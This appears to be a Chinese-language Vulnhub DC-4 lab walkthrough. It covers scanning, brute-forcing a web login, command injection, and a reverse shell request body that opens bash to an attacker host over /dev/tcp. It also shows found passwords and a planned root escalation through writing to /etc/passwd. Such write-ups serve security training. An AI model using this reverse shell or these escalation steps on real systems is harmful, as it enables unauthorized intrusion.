---
title: 'DC-4 : Walkthrough'
date: 2020-05-15T18:59:03+08:00
author: 2hanx
layout: post
categories:
  - Vulnhub
---
### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机       | IP              |
| --------- | --------------- |
| 本机（Win10） | `192.168.1.105` |
| Kali      | `192.168.1.112` |
| DC-4      | `192.168.1.111` |

### 扫描端口和版本信息

`nmap -A 192.168.1.111`

![1.png](https://i.loli.net/2020/05/15/CpGPecgXkrbDHBW.png) 

### 访问Web并确定web应用

根据 Nmap 扫描结果可知，web 应用程序运行的是 HTTP 服务器

![2.png](https://i.loli.net/2020/05/15/3NZLmGWzpgCAO7Q.png) 

经过审计源码，特殊字符SQL注入测试后均无所获，那么就只有暴力破解了

![3.png](https://i.loli.net/2020/05/15/Hg5halZwksNIiD4.png) 

暴力破解结果，得到账户和密码：`admin:happy`

![4.png](https://i.loli.net/2020/05/15/BUvKbjeGTYyNIJw.png) 

使用账户和密码登录后，进入到命令执行页面，看样子可执行代码

![5.png](https://i.loli.net/2020/05/15/CNu1jzmQRdSsgEw.png) 

要是这样的话，这题就简单了。通过查看`/etc/passwd` 文件可知系统存在三个用户：_charles_、_jim_、_sam_

![6.png](https://i.loli.net/2020/05/15/wjbehWO3FVKEpGU.png) 

### Getshell

修改发送请求中的请求体如下，同时在 Kali 上监听 **6677** 端口

`radio=/bin/bash -c 'bash -i >%26 /dev/tcp/192.168.1.112/6677 0>%261'&submit=Run`

![7.png](https://i.loli.net/2020/05/15/xFWcr5yIqK6EMmw.png) 

将 Kali 中已下载好的 LinEnum.sh 脚本上传到 DC-4 虚拟机中，并运行脚本得到以下有用信息

![8.png](https://i.loli.net/2020/05/15/5YHoSf2jRVFpgMl.png) 

![9.png](https://i.loli.net/2020/05/15/2cv1tGhfTsqjP6O.png) 

结果显示 `/home/jim/`目录下的 `test.sh` 脚本具有 SUID 权限。此外在 `bakups`目录下存在旧密码的备份文件，并且 _jim_ 和 _www-data_ 账户都有一份邮件。但是查看 _www-data_ 账户的邮件没什么有用信息，想读 `jim` 账户邮件也得知道 `jim` 账户的密码

![10.png](https://i.loli.net/2020/05/15/Ea52dDiqMITcABN.png) 

既然已经知道账户名和密码本，那就试着进行密码爆破。并且给出了这个文件，必然有用处

![11.png](https://i.loli.net/2020/05/15/f79AU6RCGewNDs5.png) 

果不其然，我们得到账户 _jim_ 的密码：`jibril04`。 登录上去查看一下 _jim_ 的邮件

![12.png](https://i.loli.net/2020/05/15/v2ptQOZfqrFuego.png) 

### 提权

Good，邮件里给出了 _charles_ 账户的密码：`^xHhA&hvim0y`

![13.png](https://i.loli.net/2020/05/15/Q1UzdVXwF4TeouZ.png) 

通过查看 `teehee`帮助文件，知道该命令的作用就是读写文本。看来我们可以以 _root_ 权限任意写文件，那么我们通过修改 `/etc/passwd` 文件添加用户就可以获取 _root_ 权限

![14.png](https://i.loli.net/2020/05/15/mkUEO7Va4zZe9pR.png)